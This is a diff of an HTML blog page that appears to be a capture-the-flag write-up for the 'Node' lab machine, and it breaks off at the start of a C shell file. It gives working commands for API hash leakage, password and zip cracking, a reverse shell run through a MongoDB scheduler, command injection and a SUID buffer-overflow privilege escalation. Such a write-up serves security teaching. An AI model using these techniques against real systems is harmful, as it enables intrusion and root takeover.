@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Node write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -316,17 +316,17 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.58
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.58
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-02-28 16:09:43 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65536 ports/host]
 Discovered open port 3000/tcp on 10.10.10.58                                   
-Discovered open port 22/tcp on 10.10.10.58 </code></pre></div></div></p>
+Discovered open port 22/tcp on 10.10.10.58 </code></pre></div></p>
 
 <p>We found TCP ports 22 and 3000 open. Let&rsquo;s explore them using nmap:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p22,3000 10.10.10.58
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -A -p22,3000 10.10.10.58
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-28 18:13 EET
 Nmap scan report for 10.10.10.58
@@ -349,26 +349,26 @@ Warning: OSScan results may be unreliable because we could not find at least 1 o
 Aggressive OS guesses: Linux 3.10 - 4.8 (91%), Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%), Linux 3.18 (88%), Linux 3.16 (88%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%)
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div></div></p>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div></p>
 
 <h2 id="discovering-directories-and-files">Discovering directories and files</h2>
 
 <p>It&rsquo;s hard to brute force directories and files on the website at port 3000 because it returns the same response (status code 200) for nonexistent pages. But, if we surf this site using a proxy (like those of burpsuite or zaproxy) we intercept some very interesting requests:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">GET /partials/home.html
+<div class="bg-black"><pre><code class="language-console" data-lang="console">GET /partials/home.html
 GET /api/users/latest
 POST /api/session/authenticate
 Exploitation
-Getting mark user</code></pre></div></div>
+Getting mark user</code></pre></div>
 
 <p>Let&rsquo;s visit <a href="http://10.10.10.58:3000/api/users/latest" target="_blank">http://10.10.10.58:3000/api/users/latest</a>
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">[{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]</code></pre></div></p>
 
 <p>Hmmm. None of those users is an admin. Let&rsquo;s visit <a href="http://10.10.10.58:3000/api/users/" target="_blank">http://10.10.10.58:3000/api/users/</a>
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">[{&#34;_id&#34;:&#34;59a7365b98aa325cc03ee51c&#34;,&#34;username&#34;:&#34;myP14ceAdm1nAcc0uNT&#34;,&#34;password&#34;:&#34;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#34;,&#34;is_admin&#34;:true},{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">[{&#34;_id&#34;:&#34;59a7365b98aa325cc03ee51c&#34;,&#34;username&#34;:&#34;myP14ceAdm1nAcc0uNT&#34;,&#34;password&#34;:&#34;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#34;,&#34;is_admin&#34;:true},{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]</code></pre></div></p>
 
 <p>Bingo! An additional username has appeared and he is an admin. The password field seems to be a hash. Let&rsquo;s find what type of hash it is:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashid dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hashid dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
 
 Analyzing &#39;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#39;
 [+] Snefru-256 
@@ -379,10 +379,10 @@ Analyzing &#39;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&
 [+] GOST CryptoPro S-Box 
 [+] SHA3-256 
 [+] Skein-256 
-[+] Skein-512(256)</code></pre></div></div></p>
+[+] Skein-512(256)</code></pre></div></p>
 
 <p>Let&rsquo;s crack (i.e. reverse) this hash using hashcat:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ hashcat -h | grep SHA-256
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ hashcat -h | grep SHA-256
    1400 | SHA-256                                          | Raw Hash
    1411 | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP, SMTP, LDAP Server
 
@@ -410,10 +410,10 @@ Dictionary cache hit:
 * Bytes.....: 139921504
 * Keyspace..: 14343297
 
-dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester</code></pre></div></div></p>
+dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester</code></pre></div></p>
 
 <p>We can use John the Ripper too:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ echo dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af &gt; hash.txt
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ echo dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af &gt; hash.txt
 
 $ john --format=Raw-SHA256 --wordlist=/usr/share/dict/rockyou.txt hash.txt
 
@@ -425,21 +425,21 @@ Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed
 
 $ john --show hash.txt
-0 password hashes cracked, 1 left</code></pre></div></div></p>
+0 password hashes cracked, 1 left</code></pre></div></p>
 
 <p>For some reason, the &ldquo;&ndash;show&rdquo; option doesn&rsquo;t work correctly in my case. Let&rsquo;s just check the .pot file:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /home/alamot/.john/john.pot
-$SHA256$dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /home/alamot/.john/john.pot
+$SHA256$dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester</code></pre></div></p>
 
 <p>Login to the website using the credentials myP14ceAdm1nAcc0uNT:manchester and download the backup file. The downloading process is very unstable and may be interrupted. Make sure you download the full file (3.3MB). Unfortunately, resume is not supported. You can use wget which automatically makes multiple tries to download the file correctly (you have to provide the cookie value that you get after a successfully login).</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ wget --header &#34;Cookie: connect.sid=s%3AuGlwY_gicWrNb2ESIiDzUPn9TTi-Dstj.5E1wGaKmQ7QgeS%2BC5%2FfZ3mjy8DCwSdySPOv4rRvvZfU&#34; http://10.10.10.58:3000/api/admin/backup</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ wget --header &#34;Cookie: connect.sid=s%3AuGlwY_gicWrNb2ESIiDzUPn9TTi-Dstj.5E1wGaKmQ7QgeS%2BC5%2FfZ3mjy8DCwSdySPOv4rRvvZfU&#34; http://10.10.10.58:3000/api/admin/backup</code></pre></div>
 
 <p>The file is based64-encoded. Let&rsquo;s decode it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat myplace.backup | base64 -d &gt; backup.zip</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat myplace.backup | base64 -d &gt; backup.zip</code></pre></div></p>
 
 <p>The zip file is password protected. Let&rsquo;s crack it using fcrackzip or zipcracker-ng:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ fcrackzip -uDp /usr/share/dict/rockyou.txt backup.zip
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ fcrackzip -uDp /usr/share/dict/rockyou.txt backup.zip
 PASSWORD FOUND!!!!: pw == magicword
 
 $ zipcracker-ng -f backup.zip -w /usr/share/dict/rockyou.txt 
@@ -452,10 +452,10 @@ $ zipcracker-ng -f backup.zip -w /usr/share/dict/rockyou.txt
  . Worked at ~ 4782K pwd/sec for ~ 14M tries.
  + Password found: magicword
    HEXA[ 6D 61 67 69 63 77 6F 72 64 ]
- ^ Ex(c)iting.</code></pre></div></div></p>
+ ^ Ex(c)iting.</code></pre></div></p>
 
 <p>If we explore the decompressed files from backup.zip, we find some credentials inside var/www/myplace/app.js:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ head -n12 var/www/myplace/app.js
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ head -n12 var/www/myplace/app.js
 
 const express     = require(&#39;express&#39;);
 const session     = require(&#39;express-session&#39;);
@@ -467,24 +467,24 @@ const path        = require(&#34;path&#34;);
 const spawn        = require(&#39;child_process&#39;).spawn;
 const app         = express();
 const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;
-const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;</code></pre></div></div></p>
+const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;</code></pre></div></p>
 
 <p>Let&rsquo;s try those credentials with ssh:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">ssh mark@10.10.10.58
+<div class="bg-black"><pre><code class="language-console" data-lang="console">ssh mark@10.10.10.58
 Password: 5AYRft73VtFpc84k
 
-mark@node:~$</code></pre></div></div></p>
+mark@node:~$</code></pre></div></p>
 
 <h1 id="getting-tom-user">Getting tom user</h1>
 
 <p>Let&rsquo;s find if user tom is running anything:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ps aux | grep tom
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ps aux | grep tom
 tom       1213  3.2  9.0 1055196 68812 ?       Ssl  05:02   8:20 /usr/bin/node /var/www/myplace/app.js
 tom       1220  0.0  4.9 1008568 37896 ?       Ssl  05:02   0:04 /usr/bin/node /var/scheduler/app.js
-mark     18678  0.0  0.1  14228   940 pts/4    S+   09:21   0:00 grep --color=auto tom</code></pre></div></div></p>
+mark     18678  0.0  0.1  14228   940 pts/4    S+   09:21   0:00 grep --color=auto tom</code></pre></div></p>
 
 <p>The file /var/scheduler/app.js seems interesting:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /var/scheduler/app.js
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /var/scheduler/app.js
 const exec        = require(&#39;child_process&#39;).exec;
 const MongoClient = require(&#39;mongodb&#39;).MongoClient;
 const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
@@ -513,35 +513,35 @@ MongoClient.connect(url, function(error, db) {
     });
   }, 30000);
 
-});</code></pre></div></div></p>
+});</code></pre></div></p>
 
 <p>In MongoDB, databases hold collections of documents i.e. MongoDB stores documents in collections. Collections are analogous to tables in relational databases. We see that /var/scheduler/app.js connects to a mondodb database named &ldquo;scheduler&rdquo;, searches for documents in a collection named &ldquo;tasks&rdquo; and executes their &ldquo;cmd&rdquo; field. Let&rsquo;s connect to mongodb and insert a new document in the tasks collection. The command we want to be executed by user tom will be in the &ldquo;cmd&rdquo; field.
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">mark@node: mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
+<div class="bg-black"><pre><code class="language-console" data-lang="console">mark@node: mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k
 mark@node: &gt; db.tasks.insertOne({cmd:&#34;/usr/bin/python2 /dev/shm/.a/shell.py&#34;});
 {
     &#34;acknowledged&#34; : true,
     &#34;insertedId&#34; : ObjectId(&#34;5a97cc23089575233c6082cc&#34;)
 }
-&gt;</code></pre></div></div></p>
+&gt;</code></pre></div></p>
 
 <p>On your side:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ socat file:`tty`,echo=0,raw tcp4-listen:60000</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ socat file:`tty`,echo=0,raw tcp4-listen:60000</code></pre></div></p>
 
 <p>or simply:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc -lvp 60000
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc -lvp 60000
 nc: listening on :: 60000 ...
 nc: connect to 10.10.15.154 60000 from 10.10.10.58 (10.10.10.58) 50488 [50488]
 nc: using stream socket
 To run a command as administrator (user &#34;root&#34;), use &#34;sudo &lt;command&gt;&#34;.
 See &#34;man sudo_root&#34; for details.
 
-tom@node:/$</code></pre></div></div>
+tom@node:/$</code></pre></div>
 
 <h1 id="getting-root">Getting root</h1>
 
 <p>Let&rsquo;s examine /var/www/myplace/app.js:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ cat /var/www/myplace/app.js | grep backup
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ cat /var/www/myplace/app.js | grep backup
 cat /var/www/myplace/app.js | grep backup
 const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
   app.get(&#39;/api/admin/backup&#39;, function (req, res) {
@@ -549,21 +549,21 @@ const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d02301
       var backup = &#39;&#39;;
         res.header(&#34;Content-Disposition&#34;, &#34;attachment; filename=myplace.backup&#34;);
         res.send(backup);
-        backup += chunk;</code></pre></div></div></p>
+        backup += chunk;</code></pre></div></p>
 
 <p>Note those lines:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
 ...
 var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Let&rsquo;s check the permissions of /usr/local/bin/backup:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ ls -al /usr/local/bin/backup
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ ls -al /usr/local/bin/backup
 ls -al /usr/local/bin/backup
--rwsr-xr-- 1 root admin 16484 Sep  3 11:30 /usr/local/bin/backup</code></pre></div></div></p>
+-rwsr-xr-- 1 root admin 16484 Sep  3 11:30 /usr/local/bin/backup</code></pre></div></p>
 
 <p>Interesting. It&rsquo;s a root-owned SUID executable! I bet we can find many ways to exploit this backup app. Let&rsquo;s explore it using ltrace:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ ltrace /usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /tmp/a 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ ltrace /usr/local/bin/backup -q 3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110 /tmp/a 
 __libc_start_main(0x80489fd, 4, 0xff84f0a4, 0x80492c0 &lt;unfinished ...&gt;
 geteuid()                                                              = 1000
 setuid(1000)                                                           = 0
@@ -612,23 +612,23 @@ system(&#34;/usr/bin/base64 -w0 /tmp/.backup&#34;...UEsDBBQACQAIAH&lt;no return 
 --- SIGCHLD (Child exited) ---
 &lt;... system resumed&gt; )                                                 = 0
 remove(&#34;/tmp/.backup_2036912201&#34;)                                      = 0
-fclose(0x9344008)</code></pre></div></div></p>
+fclose(0x9344008)</code></pre></div></p>
 
 <p>We see that the directory is zipped using &ldquo;magicword&rdquo; as password and then the zip file is getting base64-encoded. Moreover, we notice that there are many filters in place that use strchr() or strstr(). Let&rsquo;s see if we can bypass them.</p>
 
 <h2 id="1-using-symbolic-links">1. Using symbolic links:</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/$ mkdir -p /dev/shm/test1/test2
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/$ mkdir -p /dev/shm/test1/test2
 tom@node:/$ ln -s /root/root.txt /dev/shm/test1/test2/r
 
 tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /dev/shm/test1/test2/r | base64 -d &gt; /dev/shm/.a/mybackup.zip
 
 tom@node:/$ unzip /dev/shm/.a/mybackup.zip
-password: magicword</code></pre></div></div>
+password: magicword</code></pre></div>
 
 <h2 id="2-using-special-characters">2. Using special characters:</h2>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Backslash escape:
+<div class="bg-black"><pre><code class="language-console" data-lang="console">Backslash escape:
 
 tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
 
@@ -645,12 +645,12 @@ Brace expansion:
 tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo[t]/roo[t].txt&#34; | base64 -d &gt; /dev/shm/.a/mybackup.zip
 
 tom@node:/$ unzip /dev/shm/.a/mybackup.zip
-password: magicword</code></pre></div></div>
+password: magicword</code></pre></div>
 
 <h2 id="3-using-multiline-command-injection">3. Using multiline command injection:</h2>
 
 <p>We can use a combo of $(), printf and newlines to inject commands (we don&rsquo;t see the output of the last chained command because internally there is a redirection to &gt; /dev/null):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;$(printf &#39;\n/bin/sh\necho OK&#39;)&#34;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;$(printf &#39;\n/bin/sh\necho OK&#39;)&#34;
 
 zip error: Nothing to do! (/tmp/.backup_1942371757)
 # whoami
@@ -661,19 +661,19 @@ The $&#39;...&#39; syntax works too. It creates a string, with backslash-escaped
 
 zip error: Nothing to do! (/tmp/.backup_1942371757)
 # whoami
-root</code></pre></div></div></p>
+root</code></pre></div></p>
 
 <h2 id="4-using-buffer-overflow-the-smart-way">4. Using buffer overflow (the smart way)</h2>
 
 <p>The backup app suffers from buffer overflow:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*507)&#39;)
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*507)&#39;)
 [!] The target path doesn&#39;t exist
 
 $ /usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*508)&#39;)
-Segmentation fault (core dumped)</code></pre></div></div></p>
+Segmentation fault (core dumped)</code></pre></div></p>
 
 <p>You can download the backup app and explore it using radare2 (the app needs also the file /etc/myplace/keys in the proper place):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ r2 -d ./backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*512)&#39;)
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ r2 -d ./backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python2 -c &#39;print(&#34;A&#34;*512)&#39;)
 
 [0xf7fb09c0]&gt; dc
 child stopped with signal 11
@@ -694,36 +694,36 @@ oeax = 0xffffffff
 By experimenting we see that:
 1. Size 508 doesn&#39;t overwrite ebp
 2. Size 512 overwrites ebp (ebp = 0x41414141)
-3. Size 516 overwrites ebp and eip (eip 0x41414141)</code></pre></div></div></p>
+3. Size 516 overwrites ebp and eip (eip 0x41414141)</code></pre></div></p>
 
 <p>Therefore we need an overhead of 512 bytes for our payload to overwrite the &ldquo;return address&rdquo; (i.e. the eip register).</p>
 
 <p>Let&rsquo;s see if NX is present:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ r2 backup
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ r2 backup
 [0x08048780]&gt; i~nx 
-nx       true</code></pre></div></div></p>
+nx       true</code></pre></div></p>
 
 <p>Now, let&rsquo;s check if ASLR is enabled on the box:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /proc/sys/kernel/randomize_va_space
-2</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /proc/sys/kernel/randomize_va_space
+2</code></pre></div></p>
 
 <p>The number 2 means full randomization. Therefore, if we use a RET2LIBC approach, the addresses will be different every time and we will have to use brute force to catch e.g. the correct libc base address. But we can use a different approach named RET2GOT (or RET2SELF as I prefer to call it). This approach uses only local elements/offsets inside the executable. Linux executables use GOT/PLT tables to automatically match the internal local offsets with the external library addresses. In other words, those addresses that aren&rsquo;t known in the time of linking are resolved by the dynamic linker at run time. You can read more on this subject here <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html" target="_blank">https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html</a> and here <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/</a></p>
 
 <p>The backup app makes internally use of the system() function but we lack something to call using this function. Ideally, we would like a null-terminated string like &ldquo;/bin/sh&rdquo;. But we don&rsquo;t have exactly this. Let&rsquo;s check what we have:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ strings /usr/local/bin/backup
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ strings /usr/local/bin/backup
 ...
 /root
 /etc
 /tmp/.backup_%i
 /usr/bin/zip -r -P magicword %s %s &gt; /dev/null
 /usr/bin/base64 -w0 %s
-...</code></pre></div></div>
+...</code></pre></div>
 
 <p>The string &ldquo;/tmp/.backup_%i&rdquo; looks promising. As a matter of fact, it&rsquo;s a perfectly legal linux filename and we can write into /tmp! :D</p>
 
 <p>Let&rsquo;s use radare2 to get the addresses in order to construct our RET2SELF payload (later on I demonstrate the use of pwntools in a script where those addresses are obtained automatically):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ r2 ./backup  ./backup
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ r2 ./backup  ./backup
 &gt; aa
 &gt; fs imports; f
 ...
@@ -735,16 +735,16 @@ nx       true</code></pre></div></div></p>
 &gt; fs strings; f
 ...
 0x08049ed5 16 str._tmp_.backup__i
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Therefore, our RET2SELF payload will be like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">0x080486a0 system()
+<div class="bg-black"><pre><code class="language-console" data-lang="console">0x080486a0 system()
 0x080486c0 exit()
-0x08049ed5 /tmp/.backup_%i (the argument for system)</code></pre></div></div></p>
+0x08049ed5 /tmp/.backup_%i (the argument for system)</code></pre></div></p>
 
 <p>Now, use nano to make a file shell.c and copy/paste this content (you can use mark ssh shell if your shell doesn&rsquo;t support nano):</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nano shell.c</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nano shell.c</code></pre></div>
 
 <div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
